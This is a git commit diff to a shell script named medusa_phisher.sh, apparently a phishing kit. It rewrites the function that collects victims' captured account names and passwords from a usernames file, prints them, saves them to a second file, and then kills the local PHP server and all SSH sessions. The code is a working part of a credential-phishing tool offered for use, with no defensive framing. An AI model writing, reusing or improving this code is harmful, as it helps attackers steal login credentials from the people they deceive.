3b424b826b07e904bdb600a2a9d6cbac33a57b68
Mel-Adrien Dodin <65346144+Adrilaw@users.noreply.github.com>
2024-09-19 17:27:06 +0400

    Update medusa_phisher.sh
    change catch_cred to kill php server and ssh

--- medusa_phisher.sh
+++ medusa_phisher.sh
@@ -717,16 +717,24 @@ createpage() {
 }
 
 catch_cred() {
+    account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
+    IFS=$'\n'
+    password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
+    
+    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" "$account"
+    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" "$password"
+    
+    cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
+    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" "$server"
 
-account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
-IFS=$'\n'
-password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
-cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
-exit 1
+    # Message before killing processes
+    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Killing processes...\e[0m\n"
 
+    # Kill PHP server and SSH session
+    pkill -f 'php -S' # Adjust the command as necessary to match your PHP server
+    pkill ssh         # This will kill all SSH sessions; be careful with this command
+
+    exit 1
 }
 
 getcredentials() {
